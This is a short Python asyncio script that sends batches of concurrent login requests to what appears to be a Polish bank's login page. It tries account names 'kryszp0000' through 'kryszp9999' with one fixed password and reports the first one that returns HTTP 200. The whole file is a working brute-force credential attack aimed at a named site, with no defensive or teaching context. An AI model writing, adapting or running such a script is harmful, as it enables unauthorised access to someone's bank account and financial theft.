import asyncio
import aiohttp
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='login_attempts.log'
)

async def try_login(session: aiohttp.ClientSession, num: int) -> bool:
    """Try a single login attempt"""
    login = f"kryszp{num:04d}"
    url = "https://kingbank.pl/logowanie"
    data = {
        'login': login,
        'password': 'golden',
        'action': 'login'
    }
    
    try:
        async with session.post(url, data=data, timeout=50) as response:
            msg = f"Attempted login with {login}: Status {response.status}"
            print(msg)
            logging.info(msg)
            return response.status == 200
    except Exception as e:
        msg = f"Error with {login}: {str(e)}"
        print(msg)
        logging.error(msg)
        return False

async def check_range(start: int, end: int):
    """Check a range of login numbers"""
    connector = aiohttp.TCPConnector(limit=100, force_close=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        for i in range(start, end, 50):  # Process in smaller batches
            batch = range(i, min(i + 50, end))
            tasks = [try_login(session, num) for num in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check if we found a valid login
            for num, success in zip(batch, results):
                if isinstance(success, bool) and success:
                    return f"kryszp{num:04d}"
            
            # Small delay between batches
            await asyncio.sleep(0.5)
    
    return None

async def main():
    print("Starting login check...")
    result = await check_range(0, 10000)
    if result:
        print(f"Found valid login: {result}")
    else:
        print("No valid login found")

if __name__ == "__main__":
    asyncio.run(main())
